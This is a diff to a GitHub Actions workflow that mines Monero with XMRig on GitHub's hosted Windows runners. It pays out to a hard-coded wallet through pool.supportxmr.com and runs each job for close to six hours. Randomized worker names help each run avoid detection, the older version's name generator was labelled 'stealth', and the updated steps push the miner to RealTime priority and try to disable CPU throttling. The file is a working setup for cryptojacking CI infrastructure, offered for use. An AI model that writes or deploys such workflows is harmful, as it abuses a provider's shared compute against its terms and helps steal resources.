@@ -1,52 +1,101 @@
-name: 🚀 High-Performance Windows XMRig Miner (Fixed)
+name: Windows XMRig Miner (Max Performance)
 
 on:
   workflow_dispatch:
 
 jobs:
-  ultra_mine:
+  mine:
     runs-on: windows-latest
-    timeout-minutes: 355
+    timeout-minutes: 355  # Maximum allowed runtime
     steps:
-      - name: 🎲 Generate stealth worker name
+      - name: Generate random worker name
         id: worker
-        run: echo "name=win-$(Get-Random -Minimum 10000 -Maximum 99999)-$(Get-Date -Format 'HHmmss')" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+        run: echo "name=laptop$((Get-Random -Minimum 1 -Maximum 100001))" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
 
-      - name: ⚡ Download tuned XMRig
+      - name: Download and configure XMRig
         run: |
           mkdir -p $env:USERPROFILE\miner
           cd $env:USERPROFILE\miner
-          curl -sLo xmrig.zip https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip
-          tar -xf xmrig.zip
-          ren xmrig-6.21.0 xmrig
+          Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig.zip"
+          Expand-Archive -Path "xmrig.zip" -DestinationPath .
+          Rename-Item -Path "xmrig-6.21.0" -NewName "xmrig"
+          cd xmrig
+          # Create optimized config.json
+          @'
+          {
+            "autosave": false,
+            "cpu": {
+              "enabled": true,
+              "huge-pages": false,
+              "hw-aes": true,
+              "priority": 5,
+              "asm": true,
+              "argon2-impl": null,
+              "argon2": [0, 1, 2, 3],
+              "cn/0": false,
+              "cn-lite/0": false,
+              "rx": [0, 1, 2, 3],
+              "rx/wow": [0, 1, 2, 3],
+              "cn-pico": [0, 1, 2, 3],
+              "cn-heavy/0": false,
+              "cn-heavy/tube": false,
+              "cn-heavy/xhv": false,
+              "cn/1": false,
+              "cn/2": false,
+              "cn/r": false,
+              "cn/fast": false,
+              "cn/half": false,
+              "cn/xao": false,
+              "cn/rto": false,
+              "cn/rwz": false,
+              "cn/zls": false,
+              "cn/double": false,
+              "rx/arq": [0, 1, 2, 3],
+              "rx/keva": [0, 1, 2, 3],
+              "rx/0": false,
+              "rx/loki": false,
+              "rx/wow": false,
+              "rx/graft": false,
+              "rx/sfx": false,
+              "max-threads-hint": 100,
+              "yield": false
+            },
+            "opencl": false,
+            "cuda": false,
+            "donate-level": 1,
+            "log-file": null,
+            "pools": [
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.supportxmr.com:3333",
+                "user": "85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS",
+                "pass": "${{ steps.worker.outputs.name }}",
+                "rig-id": "${{ steps.worker.outputs.name }}",
+                "nicehash": false,
+                "keepalive": true,
+                "enabled": true,
+                "tls": false,
+                "tls-fingerprint": null,
+                "daemon": false,
+                "socks5": null,
+                "self-select": null
+              }
+            ]
+          }
+          '@ | Out-File -FilePath "config.json" -Encoding utf8
 
-      - name: 🛠️ Performance Tweaks (Fixed Syntax)
-        run: |
-          $cpuAffinityScript = @"
-          `$pid = (Get-Process -Name xmrig).Id
-          wmic process where ProcessId=`$pid CALL setpriority 'high priority'
-          `$cores = (0..(Get-WmiObject Win32_Processor).NumberOfLogicalProcessors-1)
-          `$affinity = [string]::Join(',', (`$cores | Select-Object -Skip 1))
-          `$process = Get-Process -Id `$pid
-          `$process.ProcessorAffinity = [convert]::ToInt32(`$affinity.Replace(',',''),2)
-          "@
-          Set-Content -Path affinity.ps1 -Value $cpuAffinityScript
-          Start-Process powershell -ArgumentList "-File affinity.ps1" -WindowStyle Hidden
-
-      - name: 💥 Run XMRig (Optimized)
+      - name: Run XMRig (Max Performance)
         run: |
           cd $env:USERPROFILE\miner\xmrig
-          $xmrigArgs = @(
-            "-o pool.supportxmr.com:3333",
-            "-u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS",
-            "-p ${{ steps.worker.outputs.name }}",
-            "--randomx-init=1",
-            "--randomx-mode=fast",
-            "--cpu-max-threads-hint=100",
-            "--cpu-priority=5",
-            "--argon2-impl=AVX2",
-            "--asm=auto",
-            "--donate-level=1",
-            "--no-color"
-          ) -join " "
-          Start-Process -NoNewWindow -FilePath ".\xmrig.exe" -ArgumentList $xmrigArgs
+          # Set high priority and disable power saving
+          Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow -PassThru
+          timeout /t 5 > $null
+          $xmrProcess = Get-Process xmrig -ErrorAction SilentlyContinue
+          if ($xmrProcess) {
+              $xmrProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
+              # Disable CPU throttling (requires admin, may fail on GitHub)
+              powercfg /setactive SCHEME_MIN
+              powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100
+              powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 2
+          }
